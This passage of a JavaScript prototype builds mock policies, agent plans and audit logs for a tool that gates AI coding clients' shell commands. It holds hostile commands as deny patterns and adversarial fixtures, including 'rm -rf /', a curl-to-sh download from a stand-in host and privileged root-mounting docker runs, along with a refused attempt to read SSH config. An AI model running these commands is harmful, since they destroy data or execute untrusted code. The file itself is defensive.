// Agents, policy bundles, lockdown and plan history for the v2 prototypes.
import { BADGES, C, kv, code, stepsSec, diffSec, hex } from './warden-data.js';

Object.assign(BADGES, {
  invalidated: { icon: '⊘', label: 'Invalidated', c: C.warn },
  held: { icon: '⏸', label: 'Held', c: C.warn },
  tighten: { icon: '↓', label: 'Tighten', c: C.ok },
  loosen: { icon: '↑', label: 'Loosen', c: C.warn },
  agent_current: { icon: '●', label: 'Online', c: C.ok },
  agent_behind: { icon: '⏳', label: 'Behind on policy', c: C.warn },
  agent_offline: { icon: '■', label: 'Offline', c: C.danger },
  agent_revoked: { icon: '✕', label: 'Revoked', c: C.neutral },
  lockdown: { icon: '■', label: 'Lockdown', c: C.danger },
  rotate: { icon: '↻', label: 'Key change', c: C.neutral },
});

const MIN = 60000;

export const POLICY_V42 = {
  deny_paths: ['/etc', '/root', '/home', '/var/lib/docker', '/srv/prod'],
  deny_patterns: ['rm\\s+-rf\\s+/', 'curl .*\\|\\s*(ba)?sh', 'chmod\\s+777', 'docker\\s+run\\s+.*--privileged', 'docker\\s+run\\s+.*-v\\s+/:', 'docker\\s+compose\\s+.*down\\s+.*-v'],
  cmd_git: ['clone', 'pull', 'fetch', 'checkout', 'status', 'log'],
  cmd_docker: ['ps', 'logs', 'inspect', 'start', 'stop', 'restart', 'compose'],
  cmd_npm: ['ci', 'install', 'test', 'run'],
  curl_flags_deny: ['-o', '--output', '-T', '--upload-file', '-K', '--config'],
  allowed_projects: ['dev-*'],
  denied_containers: ['prod-*', 'docker-socket-proxy'],
  git_hosts: ['github.com'],
  http_check_hosts: ['localhost', '127.0.0.1', '*.dev.lan'],
  step_timeout_s: 600, plan_max_steps: 25, output_cap_mb: 1,
};

// dir: 'deny' → adding tightens; 'allow' → adding loosens; 'limit' → lowering tightens
export const FIELDS = [
  { section: 'Paths & patterns', key: 'deny_paths', label: 'Denied paths', path: 'deny_paths', dir: 'deny' },
  { section: 'Paths & patterns', key: 'deny_patterns', label: 'Deny patterns (regex, backup layer)', path: 'commands.deny_patterns', dir: 'deny' },
  { section: 'Commands', key: 'cmd_git', label: 'git subcommands', path: 'commands.allow.git.subcommands', dir: 'allow' },
  { section: 'Commands', key: 'cmd_docker', label: 'docker subcommands', path: 'commands.allow.docker.subcommands', dir: 'allow' },
  { section: 'Commands', key: 'cmd_npm', label: 'npm subcommands', path: 'commands.allow.npm.subcommands', dir: 'allow' },
  { section: 'Commands', key: 'curl_flags_deny', label: 'curl denied flags', path: 'commands.allow.curl.flags_deny', dir: 'deny' },
  { section: 'Docker', key: 'allowed_projects', label: 'Allowed compose projects', path: 'docker.allowed_projects', dir: 'allow' },
  { section: 'Docker', key: 'denied_containers', label: 'Denied containers', path: 'docker.denied_containers', dir: 'deny' },
  { section: 'Network', key: 'git_hosts', label: 'Git hosts', path: 'network.git_hosts', dir: 'allow' },
  { section: 'Network', key: 'http_check_hosts', label: 'HTTP check hosts', path: 'network.http_check_hosts', dir: 'allow' },
  { section: 'Limits', key: 'step_timeout_s', label: 'Step timeout', path: 'limits.step_timeout_s', dir: 'limit', unit: 's' },
  { section: 'Limits', key: 'plan_max_steps', label: 'Steps per plan', path: 'limits.plan_max_steps', dir: 'limit', unit: 'steps' },
  { section: 'Limits', key: 'output_cap_mb', label: 'Output cap per step', path: 'limits.output_cap_mb', dir: 'limit', unit: 'MB' },
];

export const clone = (o) => JSON.parse(JSON.stringify(o));

// Defaults to loosen whenever any change can't be proven to tighten.
export function classify(cur, draft) {
  const changes = [];
  FIELDS.forEach(f => {
    if (f.dir === 'limit') {
      const a = Number(cur[f.key]), b = Number(draft[f.key]);
      if (a !== b) changes.push({ path: f.path, op: b < a ? 'lower' : 'raise', before: a, after: b, effect: b < a ? 'tighten' : 'loosen' });
      return;
    }
    const A = cur[f.key], B = draft[f.key];
    B.filter(x => !A.includes(x)).forEach(v => changes.push({ path: f.path, op: 'add', value: v, effect: f.dir === 'deny' ? 'tighten' : 'loosen' }));
    A.filter(x => !B.includes(x)).forEach(v => changes.push({ path: f.path, op: 'remove', value: v, effect: f.dir === 'deny' ? 'loosen' : 'tighten' }));
  });
  const cls = !changes.length ? 'none' : changes.every(c => c.effect === 'tighten') ? 'tighten' : 'loosen';
  return { changes, cls };
}

export function changeText(c) {
  if (c.op === 'lower' || c.op === 'raise') return `${c.path}: ${c.before} → ${c.after}`;
  return `${c.op === 'add' ? '+' : '−'} ${c.path}: ${c.value}`;
}

export function toYaml(cur, draft) {
  const out = [];
  const L = (text, mark = ' ') => out.push({ text, mark });
  const list = (key, indent) => {
    const A = cur[key], B = draft[key];
    A.forEach(v => L(`${indent}- ${JSON.stringify(v)}`, B.includes(v) ? ' ' : '-'));
    B.filter(v => !A.includes(v)).forEach(v => L(`${indent}- ${JSON.stringify(v)}`, '+'));
  };
  const num = (key, indent) => {
    if (cur[key] === draft[key]) L(`${indent}${key}: ${cur[key]}`);
    else { L(`${indent}${key}: ${cur[key]}`, '-'); L(`${indent}${key}: ${draft[key]}`, '+'); }
  };
  L('deny_paths:'); list('deny_paths', '  ');
  L(''); L('commands:'); L('  allow:');
  L('    git:'); L('      subcommands:'); list('cmd_git', '        ');
  L('    docker:'); L('      subcommands:'); list('cmd_docker', '        ');
  L('    curl:'); L('      flags_deny:'); list('curl_flags_deny', '        ');
  L('    npm:'); L('      subcommands:'); list('cmd_npm', '        ');
  L('  deny_patterns:'); list('deny_patterns', '    ');
  L(''); L('docker:'); L('  allowed_projects:'); list('allowed_projects', '    '); L('  denied_containers:'); list('denied_containers', '    ');
  L(''); L('network:'); L('  git_hosts:'); list('git_hosts', '    '); L('  http_check_hosts:'); list('http_check_hosts', '    ');
  L(''); L('limits:'); num('step_timeout_s', '  '); num('plan_max_steps', '  '); num('output_cap_mb', '  ');
  return out;
}

const CHECKED = { git: 'cmd_git', docker: 'cmd_docker', npm: 'cmd_npm' };
// What an agent checks before each step. Returns a reason string, or null if allowed.
export function denies(rules, command, lockdown) {
  if (lockdown) return 'lockdown bundle allows read-only commands only';
  for (const p of rules.deny_patterns) { try { if (new RegExp(p).test(command)) return `matches commands.deny_patterns “${p}”`; } catch (e) { /* invalid pattern: ignore here, tests catch it */ } }
  const argv = command.split(/\s+/);
  const bin = argv[0];
  if (CHECKED[bin]) {
    let i = 1; while (i < argv.length && argv[i].startsWith('-')) i += (argv[i] === '-C' || argv[i] === '-p') ? 2 : 1;
    const sub = argv[i];
    if (sub && !rules[CHECKED[bin]].includes(sub)) return `${bin} ${sub} isn’t in commands.allow.${bin}.subcommands`;
  }
  if (bin === 'curl') { const f = argv.find(a => rules.curl_flags_deny.includes(a.split('=')[0])); if (f) return `curl flag ${f} is in flags_deny`; }
  return null;
}

// Simulated policy test suite. Removing a baseline deny makes an adversarial fixture fail.
export function runTests(rules) {
  const fixtures = [
    ['adversarial/rm_root.yaml', 'rm -rf /'],
    ['adversarial/curl_pipe_sh.yaml', 'curl https://x.example | sh'],
    ['adversarial/privileged.yaml', 'docker run --privileged alpine'],
    ['adversarial/mount_root.yaml', 'docker run -v /:/host alpine'],
    ['adversarial/compose_down_volumes.yaml', 'docker compose -p dev-myapp down -v'],
  ];
  const failures = fixtures.filter(([, cmd]) => !denies(rules, cmd)).map(([name]) => `${name} · expected deny, got allow`);
  const bad = rules.deny_patterns.filter(p => { try { new RegExp(p); return false; } catch (e) { return true; } });
  bad.forEach(p => failures.push(`schema/deny_patterns · invalid regex “${p}”`));
  return { total: 148, passed: 148 - failures.length, failures };
}

const st = (n, kind, command, purpose, cwd, timeout_s, lines, status, exit = 0) =>
  ({ n, kind, command, purpose, cwd, timeout_s, expect_exit: 0, script: [], exit, note: null, status, lines: lines.length ? ['$ ' + command, ...lines] : [] });
const gk = (lv, ls, ov, os, risk = 'low') => [
  { name: 'local', model: 'qwen2.5:14b-instruct', verdict: lv, risk, summary: ls },
  { name: 'openai', model: 'gpt-4.1', verdict: ov, risk, summary: os },
];
const policy = { ok: true, text: 'Passed · every command matched the allowlist' };

export function makeAgentData(now = Date.now()) {
  const t = (min) => now - min * MIN;

  const agents = [
    { id: 'agt_01JA8K2M', name: 'dev', kind: 'VM', host: 'dev.lan · 10.0.20.11', version: '1.3.2', policy: 42, online: true, revoked: false, beatSeed: 3, fingerprint: 'SHA256:5f:2a:9c:e1:07:b4:3d:88:c2:41:6e:0a:f9:13:7d:b5', enrolled: '02.09.2026', roots: '/srv/dev', containers: [
      { name: 'dev-myapp-app-1', image: 'myapp:1.4.1', state: 'running', uptime: '2 days' },
      { name: 'dev-myapp-db-1', image: 'postgres:16', state: 'running', uptime: '2 days' },
      { name: 'dev-postgres-1', image: 'postgres:16', state: 'running', uptime: '6 days' },
      { name: 'dev-redis-1', image: 'redis:7', state: 'exited (0)', uptime: '—' },
    ] },
    { id: 'agt_01JA9P7R', name: 'dev2', kind: 'VM', host: 'dev2.lan · 10.0.20.12', version: '1.3.2', policy: 42, online: true, revoked: false, beatSeed: 9, fingerprint: 'SHA256:b1:7e:40:3a:d9:62:0f:c8:55:e3:21:9b:4d:a6:08:fe', enrolled: '14.09.2026', roots: '/srv/dev', containers: [
      { name: 'dev-legacy-web-1', image: 'nginx:1.27', state: 'running', uptime: '11 days' },
    ] },
    { id: 'agt_01JAQ3V1', name: 'sec-vault', kind: 'LXC · unprivileged', host: 'sec-vault.lan · 10.0.30.11', version: '1.3.2', policy: 42, online: true, revoked: false, beatSeed: 1, fingerprint: 'SHA256:0c:91:5e:a7:33:f2:6b:d0:19:84:c5:7a:e2:4f:b8:61', enrolled: '11.10.2026', roots: '/srv/app', containers: [] },
    { id: 'agt_01JAQ3V8', name: 'sec-auth', kind: 'LXC · unprivileged', host: 'sec-auth.lan · 10.0.30.12', version: '1.3.2', policy: 42, online: true, revoked: false, beatSeed: 6, fingerprint: 'SHA256:d4:28:7b:10:e9:5a:c3:46:8f:02:b7:39:6e:a1:fd:57', enrolled: '11.10.2026', roots: '/srv/app', containers: [] },
    { id: 'agt_01JAQ3VD', name: 'sec-dns', kind: 'LXC · unprivileged', host: 'sec-dns.lan · 10.0.30.13', version: '1.3.2', policy: 42, online: true, revoked: false, beatSeed: 11, fingerprint: 'SHA256:7a:e5:02:c8:41:9d:b6:13:f0:58:2c:a9:64:3b:e7:0d', enrolled: '11.10.2026', roots: '/srv/app', containers: [] },
  ];

  const groups = [
    { name: 'high-security', desc: 'Unprivileged LXC containers that hold secrets and auth', members: ['sec-vault', 'sec-auth', 'sec-dns'], read_only: 'restricted', ro_deny_paths: ['/home', '/root', '/etc/ssl/private', '/var/lib/vault'], deny_patterns: ['docker\\s+exec', 'curl\\s+.*-X\\s*(POST|PUT|DELETE)'], max_steps: 10, passkey: true, unanimous: true, lastBlock: { ts: t(178), text: 'cat /home/admin/.ssh/config on sec-auth' } },
    { name: 'dev-servers', desc: 'Throwaway dev VMs', members: ['dev', 'dev2'], read_only: 'allowed', ro_deny_paths: [], deny_patterns: [], max_steps: 25, passkey: false, unanimous: false, lastBlock: null },
  ];

  const history = [
    { v: 42, ts: t(2 * 1440 + 35), cls: 'tighten', summary: 'Deny docker compose … down -v (deletes volumes)', by: 'dashboard:you', keys: 'online', rollout: '2 of 2 agents in 3 s', changes: ['+ commands.deny_patterns: docker\\s+compose\\s+.*down\\s+.*-v'] },
    { v: 41, ts: t(6 * 1440), cls: 'loosen', summary: 'Allow npm run for build scripts', by: 'cli:you', keys: 'online + offline (YubiKey 5C)', rollout: '2 of 2 agents in 2 s', changes: ['+ commands.allow.npm.subcommands: run'] },
    { v: 40, ts: t(13 * 1440), cls: 'tighten', summary: 'Deny curl -K / --config', by: 'dashboard:you', keys: 'online', rollout: '2 of 2 agents in 4 s', changes: ['+ commands.allow.curl.flags_deny: -K', '+ commands.allow.curl.flags_deny: --config'] },
    { v: 39, ts: t(20 * 1440), cls: 'tighten', summary: 'Lower output cap 5 → 1 MB', by: 'dashboard:you', keys: 'online', rollout: '2 of 2 agents in 2 s', changes: ['limits.output_cap_mb: 5 → 1'] },
    { v: 38, ts: t(31 * 1440), cls: 'loosen', summary: 'Allow HTTP checks to *.dev.lan', by: 'cli:you', keys: 'online + offline (YubiKey 5C)', rollout: '1 of 1 agents in 1 s', changes: ['+ network.http_check_hosts: *.dev.lan'] },
  ];

  const plans = [
    { id: 'pln_01JB7M2A', revises: null, goal: 'Deploy myapp on dev and verify HTTP health', target: 'dev', requested_by: 'claude-code', risk: 'low', final: 'allow', status: 'failed', failedAt: 3,
      created: t(23), expires: t(-7), started: t(20.6), ended: t(20), approval: { at: t(21), by: 'iphone:you' }, policy,
      gatekeepers: gk('allow', 'Clone, check out, install, deploy and probe health. Matches the goal.', 'allow', 'Standard deploy. Nothing outside the goal.'),
      steps: [
        st(1, 'git', 'git clone https://github.com/you/myapp /srv/dev/myapp', 'Get source code', '/srv/dev', 120, ["Cloning into '/srv/dev/myapp'...", 'Receiving objects: 100% (1832/1832), 4.1 MB | 9.0 MB/s, done.'], 'succeeded'),
        st(2, 'git', 'git -C /srv/dev/myapp checkout v1.4.2', 'Pin the release tag', '/srv/dev/myapp', 30, ['HEAD is now at 3f9c2e1 Release v1.4.2'], 'succeeded'),
        st(3, 'shell', 'npm ci', 'Install exact dependencies', '/srv/dev/myapp', 300, ['npm ERR! code EUSAGE', 'npm ERR! The `npm ci` command can only install with an existing package-lock.json or', 'npm ERR! npm-shrinkwrap.json with lockfileVersion >= 1.', 'exit 1'], 'failed', 1),
        st(4, 'docker', 'docker compose -p dev-myapp up -d --build', 'Build and start the app containers', '/srv/dev/myapp', 600, [], 'skipped'),
        st(5, 'http_check', 'curl -I http://localhost:8080/health', 'Verify the health endpoint answers 200', '/srv/dev/myapp', 15, [], 'skipped'),
      ] },
    { id: 'pln_01JB6T2Q', revises: null, goal: 'Clear the build cache for myapp on dev', target: 'dev', requested_by: 'claude-code', risk: 'low', final: 'allow', status: 'failed', failedAt: 2, failReason: 'policy_violation',
      created: t(212), expires: t(182), started: t(205), ended: t(205), approval: { at: t(206), by: 'dashboard:you' }, policy,
      gatekeepers: gk('allow', 'Lists, then removes the cache folder inside the workspace.', 'allow', 'Cache cleanup inside /srv/dev/myapp. Matches the goal.'),
      steps: [
        st(1, 'shell', 'ls -la /srv/dev/myapp/.cache', 'Look at the cache folder', '/srv/dev/myapp', 15, ['lrwxrwxrwx 1 warden warden 14 Oct 18 21:02 /srv/dev/myapp/.cache -> /var/cache/npm'], 'succeeded'),
        st(2, 'shell', 'rm -rf /srv/dev/myapp/.cache/_cacache', 'Remove the npm cache', '/srv/dev/myapp', 60, ['warden-agent (dev): refused · policy_violation', '  realpath /srv/dev/myapp/.cache/_cacache → /var/cache/npm/_cacache', '  symlink leaves workspace_roots /srv/dev', '  policy v42 · step not executed'], 'failed', 126),
        st(3, 'shell', 'npm cache verify', 'Rebuild the cache index', '/srv/dev/myapp', 120, [], 'skipped'),
      ] },
    { id: 'pln_01JB6Z1C', revises: null, goal: 'Restart dev-legacy-web after the config change', target: 'dev2', requested_by: 'claude-desktop', risk: 'low', final: 'allow', status: 'failed', failedAt: 1, failReason: 'agent_disconnected',
      created: t(318), expires: t(288), started: t(309), ended: t(308), approval: { at: t(310), by: 'iphone:you' }, policy,
      gatekeepers: gk('allow', 'Restarts one dev container and checks it answers.', 'allow', 'Matches the goal.'),
      steps: [
        st(1, 'docker', 'docker restart dev-legacy-web-1', 'Restart the web container', '/srv/dev', 60, ['… connection to warden lost', 'warden-agent (dev2): step killed after its 60 s timeout', 'warden-agent (dev2): remaining steps aborted · agent_disconnected'], 'failed', 137),
        st(2, 'http_check', 'curl -I http://localhost:8081/', 'Check the site answers', '/srv/dev', 15, [], 'skipped'),
      ] },
    { id: 'pln_01JB6W8E', revises: null, goal: 'Tear down the dev-legacy stack and rebuild it', target: 'dev2', requested_by: 'claude-code', risk: 'medium', final: 'escalate', status: 'invalidated', invalidatedBy: 42,
      invalidReason: 'Policy v42 denies step 1 (docker compose … down -v deletes volumes)',
      created: t(2 * 1440 + 52), expires: t(2 * 1440 + 22), ended: t(2 * 1440 + 35), approval: { at: t(2 * 1440 + 40), by: 'dashboard:you' }, policy,
      gatekeepers: gk('allow', 'Tears the stack down and rebuilds it.', 'escalate', 'down -v deletes named volumes, including any data.', 'medium'),
      steps: [
        st(1, 'docker', 'docker compose -p dev-legacy down -v', 'Stop the stack and remove volumes', '/srv/dev/legacy', 120, [], 'pending'),
        st(2, 'docker', 'docker compose -p dev-legacy up -d --build', 'Rebuild and start it', '/srv/dev/legacy', 600, [], 'pending'),
      ] },
    { id: 'pln_01JB6P0K', revises: null, goal: 'Pull latest warden-demo and run its tests', target: 'dev', requested_by: 'claude-code', risk: 'low', final: 'allow', status: 'succeeded',
      created: t(1460), expires: t(1430), started: t(1450), ended: t(1449), approval: { at: t(1451), by: 'dashboard:you' }, policy,
      gatekeepers: gk('allow', 'Pull and test. Matches the goal.', 'allow', 'Read-mostly. Nothing outside the goal.'),
      steps: [
        st(1, 'git', 'git -C /srv/dev/warden-demo pull --ff-only', 'Update to latest main', '/srv/dev/warden-demo', 60, ['Updating 81c0f3a..d24b9e7', 'Fast-forward', ' 3 files changed, 41 insertions(+), 9 deletions(-)'], 'succeeded'),
        st(2, 'shell', 'npm test', 'Run the test suite', '/srv/dev/warden-demo', 300, ['> warden-demo@0.3.0 test', '> vitest run', ' ✓ 38 tests passed (2.1s)'], 'succeeded'),
      ] },
  ];
  plans.forEach(p => p.steps.forEach(s => { if (s.status === 'succeeded') s.dur = 1.4; }));
  {
    const E = '\x1b[';
    const vb = { id: 'pln_01JB7V3N', revises: null, goal: 'Rebuild the myapp image with verbose build logs', target: 'dev', requested_by: 'claude-code', risk: 'low', final: 'allow', status: 'succeeded',
      created: t(16), expires: t(-14), started: t(11), ended: t(8), approval: { at: t(12), by: 'iphone:you' }, signed: true, policy,
      gatekeepers: gk('allow', 'Rebuilds one dev image with extra logging.', 'allow', 'Matches the goal.'),
      steps: [
        st(1, 'docker', 'docker compose -p dev-myapp build --progress=plain --no-cache', 'Rebuild the image with full logs', '/srv/dev/myapp', 600, [
          '#1 [internal] load build definition from Dockerfile', `#1 transferring dockerfile: 612B ${E}32mdone${E}0m`,
          '#4 [build 2/6] COPY package.json package-lock.json ./', '#5 [build 3/6] RUN npm ci',
          `#5 12.4 ${E}33mnpm WARN${E}0m deprecated inflight@1.0.6: This module is not supported`, '#5 31.9 added 1287 packages in 19s',
          '#7 [build 5/6] RUN npm run build -- --verbose', `#7 0.82 ${E}36minfo${E}0m  - Linting and checking validity of types`, `#7 4.10 ${E}36minfo${E}0m  - Compiled successfully`,
          `#7 4.11 ${E}2mverbose${E}0m webpack chunk 0 (main) 412 KiB`, `#7 4.11 ${E}2mverbose${E}0m webpack chunk 1 (vendor) 1.9 MiB`, `#7 4.12 ${E}2mverbose${E}0m module graph: 18 422 modules`,
          `${E}1;33m⋯ warden-agent: output truncated at 1 MB · the step kept running, the rest wasn’t kept${E}0m`,
        ], 'succeeded'),
        st(2, 'http_check', 'curl -sS -I http://localhost:8080/health', 'Check the rebuilt app answers', '/srv/dev/myapp', 15, ['HTTP/1.1 200 OK', 'Content-Type: application/json'], 'succeeded'),
      ] };
    vb.steps[0].truncated = true; vb.steps[0].bytes = 1048576; vb.steps[0].dur = 142.6; vb.steps[1].dur = 0.2;
    plans.push(vb);
  }

  const audit = [
    [4809, t(205), 'agent:dev', 'step_refused', 'pln_01JB6T2Q · step 2 · policy_violation', [
      kv('Refused by agent', [['Agent', 'dev · agt_01JA8K2M', true], ['Command', 'rm -rf /srv/dev/myapp/.cache/_cacache', true], ['realpath', '/var/cache/npm/_cacache (symlink, outside /srv/dev)', true], ['Policy', 'v42 · sha256:3e91…c07a', true], ['Plan hash', '✓ matches'], ['Approval signature', '✓ valid']]),
      code('Agent output', ['$ rm -rf /srv/dev/myapp/.cache/_cacache', 'warden-agent (dev): refused · policy_violation', '  realpath /srv/dev/myapp/.cache/_cacache → /var/cache/npm/_cacache', '  symlink leaves workspace_roots /srv/dev', '  policy v42 · step not executed'])]],
    [4808, t(308), 'warden', 'agent_disconnected', 'dev2 · pln_01JB6Z1C failed', [
      kv('Disconnect', [['Agent', 'dev2 · agt_01JA9P7R', true], ['Last heartbeat', '15 s before'], ['Running step', '1 · docker restart dev-legacy-web-1', true], ['Agent action', 'killed step after its 60 s timeout, aborted the rest']]),
      code('Last output received', ['$ docker restart dev-legacy-web-1', '… connection to warden lost'])]],
    [4807, t(2 * 1440 + 35), 'warden', 'plan_invalidated', 'pln_01JB6W8E · by policy v42', [
      kv('Invalidated', [['Plan', 'pln_01JB6W8E (approved, not started)', true], ['Reason', 'step 1 matches commands.deny_patterns “docker\\s+compose\\s+.*down\\s+.*-v”', true], ['Policy', 'v42']]),
      stepsSec('Steps that were approved', [{ n: 1, command: 'docker compose -p dev-legacy down -v' }, { n: 2, command: 'docker compose -p dev-legacy up -d --build' }])]],
    [4806, t(2 * 1440 + 35.5), 'dashboard:you', 'policy_publish', 'v42 · tighten · deny compose down -v', [
      diffSec('Rule changes', [['commands.deny_patterns', '—', 'docker\\s+compose\\s+.*down\\s+.*-v']]),
      kv('Bundle', [['Version', '41 → 42'], ['Class', '↓ Tighten'], ['Signed with', 'online key · ed25519:41be…0d93', true], ['Tests', '148 / 148 passed'], ['Confirmed with', 'passkey “MacBook”'], ['Rollout', 'dev ✓ 1.2 s · dev2 ✓ 2.9 s']])]],
    [4805, t(6 * 1440), 'cli:you', 'policy_publish', 'v41 · loosen · allow npm run', [
      diffSec('Rule changes', [['commands.allow.npm.subcommands', 'ci, install, test', 'ci, install, test, run']]),
      kv('Bundle', [['Version', '40 → 41'], ['Class', '↑ Loosen'], ['Signed with', 'online key + offline key (YubiKey 5C)'], ['Offline signature', 'uploaded 14.10.2026 20:41 · ed25519:9c1f…7a2e', true], ['Rollout', 'dev ✓ · dev2 ✓']])]],
    [4804, t(36 * 1440), 'dashboard:you', 'agent_enroll', 'dev2 · agt_01JA9P7R', [
      kv('Enrollment', [['Agent', 'dev2 · agt_01JA9P7R', true], ['Token', 'wdn_enr_4M…  (one-time, used after 2 min)', true], ['Connected from', '10.0.20.12', true], ['Fingerprint', 'SHA256:b1:7e:40:3a:d9:62:0f:c8:55:e3:21:9b:4d:a6:08:fe', true], ['Confirmed by', 'you · passkey “MacBook”']])]],
  ].map(([seq, ts, actor, action, subject, detail]) => ({ seq, ts, actor, action, subject, detail, hash: hex(seq) }));
  audit.push(
    { seq: 4803, ts: t(178), actor: 'agent:sec-auth', action: 'read_only_refused', subject: 'sec-auth · cat /home/admin/.ssh/config', hash: hex(4803), detail: [kv('Refused read-only command', [['Requested by', 'claude-code'], ['Agent', 'sec-auth · agt_01JAQ3V8', true], ['argv', '["cat", "/home/admin/.ssh/config"]', true], ['Rule', 'group high-security · read_only.deny_paths includes /home', true], ['Output', 'none (not executed)']])] },
    { seq: 4802, ts: t(9 * 1440), actor: 'dashboard:you', action: 'group_create', subject: 'high-security · 3 members', hash: hex(4802), detail: [diffSec('Group rules', [['groups.high-security.members', '—', 'sec-vault, sec-auth, sec-dns'], ['groups.high-security.read_only.mode', '—', 'restricted'], ['groups.high-security.read_only.deny_paths', '—', '/home, /root, /etc/ssl/private, /var/lib/vault'], ['groups.high-security.approvals.passkey', '—', 'true']]), kv('Bundle', [['Class', '↓ Tighten (groups only add restrictions)'], ['Signed with', 'online key']])] },
  );

  const feed = [
    { ts: t(178), type: 'policy', client: 'claude-code', target: 'sec-auth', text: 'read_only cat /home/admin/.ssh/config refused · group high-security blocks /home' },
    { ts: t(205), type: 'policy', client: 'agent:dev', target: 'dev', text: 'pln_01JB6T2Q step 2 refused · policy_violation · symlink leaves /srv/dev' },
    { ts: t(308), type: 'agent', client: 'warden', target: 'dev2', text: 'dev2 disconnected mid-plan · pln_01JB6Z1C failed (agent_disconnected)' },
  ];

  const keys = {
    online: { where: 'warden guest', fp: 'ed25519:41be…0d93', since: t(124 * 1440) },
    approval: { where: 'warden guest', fp: 'ed25519:c7d2…18fa', since: t(124 * 1440) },
    offline: { where: 'YubiKey 5C · serial 1893 4412', fp: 'ed25519:9c1f…7a2e', since: t(48 * 1440) },
    backup: null,
    ca: { name: 'warden-ca', expires: now + 74 * 1440 * MIN },
  };

  return { agents, groups, keys, policy: { version: 42, rules: clone(POLICY_V42), publishedAt: t(2 * 1440 + 35), history, pending: null }, lockdown: null, plans, audit, feed };
}

export function tokenFor(name) { return 'wdn_enr_' + hex(name.length * 977 + Date.now() % 1000).slice(0, 24); }
export function fingerprintFor(seed) { const h = hex(seed); return 'SHA256:' + h.slice(0, 32).match(/../g).join(':'); }

// — Groups: overlays that can only add restrictions on top of the global policy —
export const GROUP_DEFAULT = { name: '', desc: '', members: [], read_only: 'allowed', ro_deny_paths: [], deny_patterns: [], max_steps: 25, passkey: false, unanimous: false, lastBlock: null };
export const RO_MODES = ['allowed', 'restricted', 'off'];
export const RO_LABELS = { allowed: 'Allowed', restricted: 'Restricted paths', off: 'Off' };

export function classifyGroup(cur, draft) {
  const base = cur || GROUP_DEFAULT; const changes = []; const P = (p) => `groups.${draft.name || 'new'}.${p}`;
  if (!cur) changes.push({ path: `groups.${draft.name || 'new'}`, op: 'add', value: 'new group', effect: 'tighten' });
  [['members', 'members'], ['ro_deny_paths', 'read_only.deny_paths'], ['deny_patterns', 'commands.deny_patterns']].forEach(([k, path]) => {
    draft[k].filter(x => !base[k].includes(x)).forEach(v => changes.push({ path: P(path), op: 'add', value: v, effect: 'tighten' }));
    base[k].filter(x => !draft[k].includes(x)).forEach(v => changes.push({ path: P(path), op: 'remove', value: v, effect: 'loosen' }));
  });
  if (draft.read_only !== base.read_only) changes.push({ path: P('read_only.mode'), op: 'lower', before: base.read_only, after: draft.read_only, effect: RO_MODES.indexOf(draft.read_only) > RO_MODES.indexOf(base.read_only) ? 'tighten' : 'loosen' });
  if (Number(draft.max_steps) !== Number(base.max_steps)) changes.push({ path: P('limits.plan_max_steps'), op: 'lower', before: base.max_steps, after: draft.max_steps, effect: Number(draft.max_steps) < Number(base.max_steps) ? 'tighten' : 'loosen' });
  [['passkey', 'approvals.passkey'], ['unanimous', 'gatekeepers.unanimous']].forEach(([k, path]) => {
    if (!!draft[k] !== !!base[k]) changes.push({ path: P(path), op: 'lower', before: String(!!base[k]), after: String(!!draft[k]), effect: draft[k] ? 'tighten' : 'loosen' });
  });
  const cls = !changes.length ? 'none' : changes.every(c => c.effect === 'tighten') ? 'tighten' : 'loosen';
  return { changes, cls };
}

const under = (p, root) => { const r = root.replace(/\/$/, ''); return p === r || p.startsWith(r + '/'); };
export function roDeny(groups, agent, command) {
  for (const g of groups.filter(x => x.members.includes(agent))) {
    if (g.read_only === 'off') return `group ${g.name}: read-only commands are off`;
    if (g.read_only === 'restricted') {
      const hit = command.split(/\s+/).filter(a => a.startsWith('/')).map(a => [a, g.ro_deny_paths.find(dp => under(a, dp))]).find(x => x[1]);
      if (hit) return `group ${g.name}: read_only.deny_paths includes ${hit[1]}`;
    }
  }
  return null;
}
export function groupDeny(groups, agent, command) {
  for (const g of groups.filter(x => x.members.includes(agent))) {
    for (const p of g.deny_patterns) { try { if (new RegExp(p).test(command)) return `group ${g.name}: matches deny pattern “${p}”`; } catch (e) { /* skip */ } }
  }
  return null;
}

// — Diagnosis: Claude investigates a failed plan read-only, then proposes a revision —
const rs = (n, kind, command, purpose, cwd, timeout_s, script) => ({ n, kind, command, purpose, cwd, timeout_s, expect_exit: 0, script, exit: 0, note: null, status: 'pending', lines: [] });
export function diagnose(p, roCheck) {
  const fs = p.steps.find(s => s.status === 'failed') || p.steps[0]; const cwd = fs.cwd || '/srv/dev';
  const run = (cmd, lines) => { const why = roCheck(cmd); return why ? { cmd, refused: true, lines: [`refused · ${why}`] } : { cmd, refused: false, lines }; };
  const skipped = p.steps.filter(s => s.status === 'skipped');
  let runs, findings, steps = null;
  if (p.id === 'pln_01JB7R9X') {
    runs = [
      run('docker ps', ['CONTAINER ID   IMAGE        PORTS                  NAMES', '7c1e02b9a4d3   nginx:1.27   0.0.0.0:3000->80/tcp   dev-legacy-web-1']),
      run('ls -a /srv/dev/warden-demo', ['.  ..  .env.dev2  .env.example  .git  compose.yml  package.json  src']),
      run('cat /srv/dev/warden-demo/.env.dev2', ['WEB_PORT=3001']),
    ];
    findings = 'Port 3000 on dev2 is already taken by dev-legacy-web-1. warden-demo reads WEB_PORT from an env file, and the repo ships .env.dev2 with WEB_PORT=3001. Steps 1–3 already succeeded, so the revision only starts the container with that env file and checks port 3001.';
    steps = [
      rs(1, 'docker', 'docker compose -p dev-warden-demo --env-file .env.dev2 up -d', 'Start the demo on port 3001', cwd, 300, ['[+] Running 2/2', ' ✔ Network dev-warden-demo_default  Created', ' ✔ Container dev-warden-demo-web-1  Started']),
      rs(2, 'http_check', 'curl -sS -I http://localhost:3001/', 'Check that the demo answers over HTTP', cwd, 15, ['HTTP/1.1 200 OK', 'X-Powered-By: Next.js']),
    ];
  } else if (p.failReason === 'agent_disconnected') {
    runs = [run('docker ps', ['CONTAINER ID   IMAGE        STATUS       NAMES', '7c1e02b9a4d3   nginx:1.27   Up 3 hours   dev-legacy-web-1'])];
    findings = `The restart in step ${fs.n} went through before the connection dropped; the container has been up since. Only the check after it is missing, so the revision just runs that.`;
    steps = skipped.map((s, i) => rs(i + 1, s.kind, s.command, s.purpose, s.cwd, s.timeout_s, ['HTTP/1.1 200 OK', 'Server: nginx/1.27.2']));
  } else if (p.id === 'pln_01JB6T2Q') {
